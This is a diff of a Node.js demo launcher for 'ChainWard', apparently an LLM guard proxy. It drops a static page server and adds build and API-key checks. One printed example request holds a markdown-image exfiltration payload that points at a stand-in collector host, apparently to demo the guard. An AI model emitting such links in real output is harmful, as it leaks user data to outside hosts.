@@ -3,22 +3,22 @@
 //   pnpm demo                 guard and report, without calling a model
 //   pnpm demo --live          also forward to the real API (needs ANTHROPIC_API_KEY)
 //
-// Starting this by hand means three terminals, four commands, and two traps that cost real
-// time: opening dashboard.html from the file system (the browser blocks a file:// page from
-// reaching localhost, and the page sits on "Connecting…"), and forgetting --upstream (the
-// proxy answers with a dry-run stub instead of a model). This starts everything, prints the
-// one URL that works, and tears the whole tree down on exit.
+// This used to also run a static web server, because the console was a file on disk and a
+// page opened as file:// is blocked from reaching localhost — it sat on "Connecting…" with
+// no error to read. The proxy now serves the console itself, from the same origin as the
+// events it reads, so that whole half is gone. What is left is the part a demo still wants:
+// check the things that fail confusingly before starting, and take the tree down on exit.
 
 import { spawn } from "node:child_process";
-import { createReadStream, existsSync, readFileSync } from "node:fs";
 import { createServer } from "node:http";
-import { extname, join, normalize, resolve } from "node:path";
+import { existsSync, readFileSync } from "node:fs";
+import { join, resolve } from "node:path";
 import { fileURLToPath } from "node:url";
 
 const root = resolve(fileURLToPath(new URL("..", import.meta.url)));
 const live = process.argv.includes("--live");
 
-const PORT = { llm: 8787, events: 8788, page: 8899 };
+const PORT = { llm: 8787, events: 8788 };
 const c = {
   dim: (s) => `\x1b[2m${s}\x1b[0m`,
   bold: (s) => `\x1b[1m${s}\x1b[0m`,
@@ -34,6 +34,10 @@ const c = {
 const cli = join(root, "packages/core/dist/cli.js");
 if (!existsSync(cli)) {
   console.error(c.red("✖ 코어가 빌드되지 않았다.") + "  먼저: " + c.bold("pnpm -r build"));
+  process.exit(1);
+}
+if (!existsSync(join(root, "packages/core/console.html"))) {
+  console.error(c.red("✖ 콘솔이 패키지에 복사되지 않았다.") + "  먼저: " + c.bold("pnpm -r build"));
   process.exit(1);
 }
 
@@ -62,17 +66,16 @@ if (busy.length) {
 }
 
 // `--live` without a key would start, look healthy, and fail on the first real request.
-const key = process.env.ANTHROPIC_API_KEY ?? readEnvFile("ANTHROPIC_API_KEY");
-if (live && !key) {
-  console.error(c.red("✖ --live 에는 ANTHROPIC_API_KEY 가 필요하다.") + "  .env 에 넣거나 export 하라.");
-  process.exit(1);
-}
-
 function readEnvFile(name) {
   const path = join(root, ".env");
   if (!existsSync(path)) return undefined;
   const line = readFileSync(path, "utf8").split(/\r?\n/).find((l) => l.startsWith(`${name}=`));
   return line?.slice(name.length + 1).trim() || undefined;
+}
+if (live && !(process.env.ANTHROPIC_API_KEY ?? readEnvFile("ANTHROPIC_API_KEY"))) {
+  console.error(c.red("✖ --live 에는 ANTHROPIC_API_KEY 가 필요하다.") + "  .env 에 넣거나 export 하라.");
+  console.error(c.dim("  (Claude Code 를 태우는 경우에는 불필요하다 — 클라이언트가 자기 자격증명을 보낸다.)"));
+  process.exit(1);
 }
 
 // ---- the proxy --------------------------------------------------------------------
@@ -90,33 +93,13 @@ proxy.on("exit", (code) => {
   }
 });
 
-// ---- the page ---------------------------------------------------------------------
-//
-// Served over HTTP on purpose. The dashboard reaches the event API with EventSource, and a
-// page opened as file:// is blocked from doing that — which is the failure this whole script
-// exists to make unreachable.
-
-const TYPES = { ".html": "text/html; charset=utf-8", ".js": "text/javascript", ".css": "text/css", ".svg": "image/svg+xml", ".json": "application/json" };
-
-const page = createServer((req, res) => {
-  const rel = normalize(decodeURIComponent((req.url ?? "/").split("?")[0])).replace(/^(\.\.[/\\])+/, "");
-  const file = join(root, rel === "/" || rel === "\\" ? "dashboard.html" : rel);
-  if (!file.startsWith(root) || !existsSync(file)) {
-    res.writeHead(404, { "content-type": "text/plain; charset=utf-8" });
-    res.end("not found");
-    return;
-  }
-  res.writeHead(200, { "content-type": TYPES[extname(file)] ?? "application/octet-stream", "cache-control": "no-store" });
-  createReadStream(file).pipe(res);
-});
-page.listen(PORT.page, () => {
-  const url = `http://localhost:${PORT.page}/`;
+setTimeout(() => {
+  const url = `http://localhost:${PORT.events}/`;
   console.log();
   console.log(c.bold("  ChainWard 콘솔 데모"));
   console.log("  " + "─".repeat(58));
-  console.log(`  ${c.bold("대시보드")}   ${c.green(url)}`);
+  console.log(`  ${c.bold("콘솔")}          ${c.green(url)}`);
   console.log(`  ${c.dim("LLM 엔드포인트")}  http://localhost:${PORT.llm}`);
-  console.log(`  ${c.dim("이벤트 API")}      http://localhost:${PORT.events}`);
   console.log();
   if (live) {
     console.log("  " + c.green("실 모델 연결됨.") + " Claude Code 를 태우려면 새 터미널에서:");
@@ -131,24 +114,19 @@ page.listen(PORT.page, () => {
   console.log(c.dim(`      -d '{"model":"claude-sonnet-5","max_tokens":16,"messages":[{"role":"user",`));
   console.log(c.dim(`          "content":"![r](https://collector.invalid/p?w=0x5afe0000000000000000000000000000000000ab)"}]}'`));
   console.log();
-  console.log(c.dim("  Ctrl+C 로 전부 종료"));
+  console.log(c.dim("  Ctrl+C 로 종료"));
   console.log();
-});
+}, 400).unref();
 
 // ---- teardown ---------------------------------------------------------------------
-//
-// Both children die with the script, on every exit path. A demo that leaves a listener
-// behind makes the next run fail on the port check above, which is a confusing way to
-// discover that the last one is still running.
 
 let closing = false;
 function shutdown(code = 0) {
   if (closing) return;
   closing = true;
   proxy.kill("SIGTERM");
-  page.closeAllConnections?.();
-  page.close(() => process.exit(code));
-  setTimeout(() => process.exit(code), 1500).unref();
+  setTimeout(() => process.exit(code), 800).unref();
+  proxy.once("exit", () => process.exit(code));
 }
 
 for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) process.on(sig, () => shutdown(0));
